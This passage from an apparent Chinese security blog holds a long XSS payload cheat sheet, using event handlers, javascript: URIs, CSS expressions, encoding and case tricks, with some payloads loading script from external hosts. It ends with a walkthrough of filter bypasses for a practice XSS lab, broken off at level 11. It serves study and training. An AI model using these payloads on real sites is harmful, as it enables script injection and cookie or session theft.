class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>alert(&#x27;XSS&#x27;);<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background</span>-imagurl(&quot;javascript:<span class="built_in">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)<span class="string">&quot;);&#125;</span></span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">class</span>=<span class="string">&quot;XSS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;</span>)<span class="string">&quot;)&#125;</span></span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">getURL(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line"> </span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">XML</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">&#x27;XSS&#x27;</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;&quot;</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/xss.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag"> </span></span><br><span class="line"><span class="tag">&lt;!<span class="attr">--</span>#<span class="attr">exec</span> <span class="attr">cmd</span>=<span class="string">&quot;/bin/echo &#x27;&lt;SCRIPT SRC&#x27;&quot;</span><span class="attr">--</span>&gt;</span><span class="comment">&lt;!--#exec cmd=&quot;/bin/echo</span></span><br><span class="line"><span class="comment">&#x27;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#x27;&quot;--&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> =<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> &#x27;&#x27; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> &quot;<span class="attr">a</span>=<span class="string">&#x27;&gt;&#x27;</span>&quot; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;SCRI&quot;</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">http://www.gohttp://www.google.com/ogle.com/</span>&gt;</span>link<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(‘XSS’)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">”alert(‘xxs’)”</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">/</span> <span class="attr">onerror</span>=<span class="string">”alert(String.fromCharCode(88,83,83))”</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">”&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041″</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</span></span></span><br><span class="line"><span class="tag"> </span></span><br><span class="line"><span class="tag">&amp;#<span class="attr">39</span>;&amp;#<span class="attr">88</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">39</span>;&amp;#<span class="attr">41</span>;&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav</span> <span class="attr">ascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav&amp;#x0A;ascript:alert(‘XSS’);”</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”</span> &amp;#<span class="attr">14</span>;  <span class="attr">javascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(“XSS”);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’)”</span></span></span><br><span class="line"><span class="tag"> </span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘XSS’);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”IMAGE”</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’);”</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">”javascript:alert(‘XSS’)”</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">’vbscript:msgbox(“XSS”)’</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BR</span> <span class="attr">SIZE</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">HREF</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background</span>-imagurl(&quot;javascript:<span class="built_in">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)<span class="string">&quot;);&#125;</span></span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">CLASS</span>=<span class="string">XSS</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;</span>)<span class="string">&quot;)&#125;</span></span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span>&gt;</span><span class="tag">&lt;<span class="name">TD</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">SRC</span>=<span class="string">&quot;httx://xss.rocks/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">document.domain</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">M</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.domain)</span>&gt;</span>M</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">oNeRrOr</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">OnErRoR</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(<span class="symbol">&amp;quot;</span>M<span class="symbol">&amp;quot;</span>)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">mArQuEe</span> <span class="attr">OnScRoLl</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">MaRqUeE</span> <span class="attr">oNsCrOlL</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/0/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/00/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/000/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/M/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">,alert(1)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">,alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> a=<span class="number">1</span><span class="comment">//@ sourceMappingURL=//xss.site</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span>.gif</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-imagurl(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=&lt;<span class="attr">svg</span>/<span class="attr">o</span>&amp;#<span class="attr">x6E</span>;<span class="attr">load</span>&amp;<span class="attr">equals</span>;<span class="attr">alert</span>&amp;<span class="attr">lpar</span>;<span class="attr">1</span>)&amp;<span class="attr">gt</span>;&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://baidu.com</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span>&lt;/iframe</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span>M</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Link&quot;</span> <span class="attr">Content</span>=<span class="string">&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><p><strong>1.关</strong></p><p>无过滤直接<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><strong>2.关</strong></p><p>过滤了尖括号</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E4%BA%8C%E5%85%B3.png"></p><p>①提前闭合input标签   <code> &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>,相当于&lt;input”&gt;后面无内容②使用不带中括号的标签onmouseover，语法 onmouseover=要接的js语句。<code>&quot;onmouseover=alert（xss）//</code>（双反斜杠为了注释后面的语句，该函数为鼠标经过时触发）</p><p>②使用不带中括号的标签onmouseover，语法 onmouseover=要接的js语句。”onmouseover=alert（xss）//（双反斜杠为了注释后面的语句，该函数为鼠标经过时触发）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/onmouseover%E6%A0%87%E7%AD%BE.png"></p><p><strong>3.关</strong></p><p>过滤了中括号，且提前闭合input失败 ，尝试用不带中括号的标签弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E4%B8%89%E5%85%B3.png"></p><p>单引号闭合  <code>&#39;onmouseover=alert(1)//</code> 或者<code> </code>‘onfocus=alert(9)//<code>      </code>‘onclick=alert(9)//`</p><p><strong>4.关</strong></p><p>过滤尖括号，双引号闭合;  =后面加不加javascript：不影响语句执行 <code>&quot;onmouseover=alert(1)//</code>   同第二关或者<code>&quot;onfocus=alert(1) //</code>   <code>&quot;onclick=alert(1)//</code></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/%E4%B8%A4%E4%B8%AAon%E7%9A%84%E5%8C%BA%E5%88%AB.png"></p><p>​    </p><p><strong>5.关</strong></p><p>有破坏语句，r变成r_.  尝试大小写和双写绕过</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E4%BA%94%E5%85%B3.png"></p><p><code>&quot;&gt;****&lt;a HREF=javascript:alert(1)//</code> 或者<code>&quot;&gt;***&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//</code>  大小写绕过成功</p><p><strong>7.关</strong></p><p>过滤较多，源码</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E9%85%8D%E7%BD%AE.png"></p><p>尝试 : </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E4%B8%83%E5%85%B3.png"></p><p>大小写绕过已经失败，试试双写<code>&quot;&gt;xss&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;//</code>或者  <code>&quot;&gt;&lt;a hhrefref=javasscriptcript:alert(1)//</code>等等 成功</p><p><strong>8.关</strong></p><p>有破坏语句行为，试试大小写和双写绕过，均失败</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E5%85%AB%E5%85%B3.png"></p><p>中括号还可以用，只是r变成了r_,在线编码转为unicode， javascript变成&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;  所以语句变成&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(2)//unicode：统一码，也叫万国码、单一码（Unicode）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求</p><p><strong>9.关</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E4%B9%9D%E5%85%B3.png"></p><p>所以在语句后面加个合法链接，这里javascript依旧转译，<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) http://www.baidu.com//</code>  之后果然不再显示非法，然后我们把百度网址注释掉 <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) //http://www.baidu.com//</code> </p><p><strong>10.关</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E5%8D%81%E5%85%B3.png"></p><p>Get框框 被隐藏了不再是默认的keyword，所以要手动输入 前两个 name无效，第三个有效  <code>,test&amp;t_sort=&quot;type=&quot;text&quot; onfocus = alert(1)</code>或者 <code>test  &amp;t_sort=&quot;type=text&quot; onfocus = alert(1)//</code>     在源码中是这个样子的。(在URL中还可以这样输入: ?t_sort=XXX “type XXX onmouseover=alert(1)// )</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/%E7%AC%AC%E5%8D%81%E5%85%B3.png"></p><p><strong>11.关</strong>（改refere）</p><p>PHP源码，发现有refer函数，但在下面的表单中又被转译</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3.png"></p><p>首先，从代码可以发现，过滤了尖括号与使用了htmlspecialchars函数，t_sort的值来自 